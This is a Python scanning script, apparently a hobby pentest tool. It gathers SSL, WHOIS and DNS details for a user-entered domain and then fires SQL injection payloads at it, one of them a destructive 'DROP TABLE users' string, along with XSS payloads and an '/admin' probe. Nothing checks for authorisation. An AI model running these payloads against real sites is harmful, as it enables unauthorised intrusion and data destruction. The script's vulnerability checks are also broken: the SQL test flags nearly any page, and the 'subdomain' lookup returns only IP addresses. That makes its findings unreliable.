import ssl
import socket
import whois
import requests
from OpenSSL import SSL
from pyfiglet import figlet_format
import dns.resolver  # Import dnspython for DNS resolution

def print_title():
    title = figlet_format("Pentest Probe v1.1")
    author = "By Muhammad Ali Jarral"
    print(title)
    print(author)

# Step 1: Fetch SSL certificate details
def get_ssl_certificate(domain):
    context = ssl.create_default_context()
    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=domain)
    conn.settimeout(5.0)

    try:
        conn.connect((domain, 443))
        cert = conn.getpeercert()
        return cert
    except Exception as e:
        return str(e)

# Step 2: Determine SSL/TLS version
def get_ssl_version(domain):
    context = SSL.Context(SSL.SSLv23_METHOD)
    conn = SSL.Connection(context, socket.socket(socket.AF_INET))

    try:
        conn.connect((domain, 443))
        conn.do_handshake()
        ssl_version = conn.get_protocol_version_name()
        return ssl_version
    except Exception as e:
        return str(e)

# Step 3: Categorize SSL/TLS version
def categorize_ssl_version(ssl_version):
    if 'TLSv1.3' in ssl_version:
        return 'Excellent'
    elif 'TLSv1.2' in ssl_version:
        return 'Good'
    elif 'TLSv1.1' in ssl_version or 'TLSv1' in ssl_version:
        return 'Poor'
    else:
        return 'Unknown'

# Step 4: Get domain information
def get_domain_info(domain):
    try:
        domain_info = whois.whois(domain)
        return domain_info
    except Exception as e:
        return str(e)

# Additional steps for injection checks
sql_injection_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

def stealth_check_sql_injection(url, payload):
    try:
        response = requests.get(url, params={'input': payload})
        if "error" not in response.text.lower():
            return True
    except Exception as e:
        return False
    return False

def stealth_check_xss(url, payload):
    try:
        response = requests.get(url, params={'input': payload})
        if payload in response.text:
            return True
    except Exception as e:
        return False
    return False

def ai_automated_attack(urls, payloads, check_function):
    vulnerable_urls = []
    for url in urls:
        for payload in payloads:
            if check_function(url, payload):
                vulnerable_urls.append(url)
    return vulnerable_urls

def check_broken_access_control(urls):
    vulnerable_urls = []
    # This would be a place for a more advanced check, potentially leveraging existing tools or techniques
    for url in urls:
        try:
            response = requests.get(url + '/admin')
            if response.status_code == 200:
                vulnerable_urls.append(url)
        except Exception as e:
            pass
    return vulnerable_urls

# Function to retrieve list of domains and subdomains
def get_domain_subdomains(domain):
    try:
        subdomains = []
        answers = dns.resolver.resolve(domain, 'A')
        for answer in answers:
            subdomains.append(answer.to_text())
        return subdomains
    except Exception as e:
        return [str(e)]

# Main function to run all checks
def main(domain):
    print(f"Starting SSL scan for {domain}\n")
    
    cert = get_ssl_certificate(domain)
    ssl_version = get_ssl_version(domain)
    version_category = categorize_ssl_version(ssl_version)
    domain_info = get_domain_info(domain)

    # Print certificate details
    print(f"SSL/TLS Certificate Details for {domain}:\n")
    print(f"1. Subject (The entity the certificate is issued to):")
    for item in cert.get('subject', []):
        print(f"   - {item[0][0]}: {item[0][1]}")

    print(f"\n2. Issuer (The entity that issued the certificate):")
    for item in cert.get('issuer', []):
        print(f"   - {item[0][0]}: {item[0][1]}")

    print(f"\n3. Version: {cert.get('version', 'N/A')}")

    print(f"\n4. Serial Number: {cert.get('serialNumber', 'N/A')}")

    print(f"\n5. Validity Period:")
    print(f"   - Not Before: {cert.get('notBefore', 'N/A')}")
    print(f"   - Not After: {cert.get('notAfter', 'N/A')}")

    print(f"\n6. Subject Alternative Name (Other entities the certificate is valid for):")
    for item in cert.get('subjectAltName', []):
        print(f"   - {item[0]}: {item[1]}")

    print(f"\n7. OCSP (Online Certificate Status Protocol): {cert.get('OCSP', 'N/A')}")
    
    print(f"\n8. CA Issuers (Certificate Authority Issuers): {cert.get('caIssuers', 'N/A')}")

    print(f"\n9. CRL Distribution Points (Certificate Revocation List): {cert.get('crlDistributionPoints', 'N/A')}")

    print(f"\n10. SSL/TLS Version: {ssl_version} ({version_category})\n")

    # Print domain information
    if isinstance(domain_info, str):
        print(f"Error retrieving domain information: {domain_info}")
    else:
        print(f"Domain Information for {domain}:\n")
        print(f" - Registrar: {domain_info.get('registrar', 'N/A')}")
        print(f" - Creation Date: {domain_info.get('creation_date', 'N/A')}")
        print(f" - Expiration Date: {domain_info.get('expiration_date', 'N/A')}")
        print(f" - Updated Date: {domain_info.get('updated_date', 'N/A')}")
        print(f" - Name Servers: {', '.join(domain_info.get('name_servers', []))}")

    # Retrieve list of domains and subdomains
    print(f"\nDomains and Subdomains for {domain}:\n")
    domain_list = get_domain_subdomains(domain)
    for subdomain in domain_list:
        print(f" - {subdomain}")

    # Ask user if they want to perform additional checks
    perform_sql_check = input("\nDo you want to perform SQL Injection checks? (yes/no): ").strip().lower()
    perform_xss_check = input("Do you want to perform XSS checks? (yes/no): ").strip().lower()
    perform_access_control_check = input("Do you want to perform Broken Access Control checks? (yes/no): ").strip().lower()

    urls_to_check = [f"http://{domain}", f"https://{domain}"]
    
    if perform_sql_check == 'yes':
        sql_vulnerable_urls = ai_automated_attack(urls_to_check, sql_injection_payloads, stealth_check_sql_injection)
        print("\nSQL Injection Vulnerable URLs:")
        for url in sql_vulnerable_urls:
            print(f" - {url}")
    else:
        print("\nSQL Injection check skipped.")

    if perform_xss_check == 'yes':
        xss_vulnerable_urls = ai_automated_attack(urls_to_check, xss_payloads, stealth_check_xss)
        print("\nXSS Vulnerable URLs:")
        for url in xss_vulnerable_urls:
            print(f" - {url}")
    else:
        print("\nXSS check skipped.")

    if perform_access_control_check == 'yes':
        access_control_vulnerable_urls = check_broken_access_control(urls_to_check)
        print("\nBroken Access Control Vulnerable URLs:")
        for url in access_control_vulnerable_urls:
            print(f" - {url}")
    else:
        print("\nBroken Access Control check skipped.")

if __name__ == "__main__":
    print_title()
    domain = input("Enter the domain to scan: ")
    main(domain)
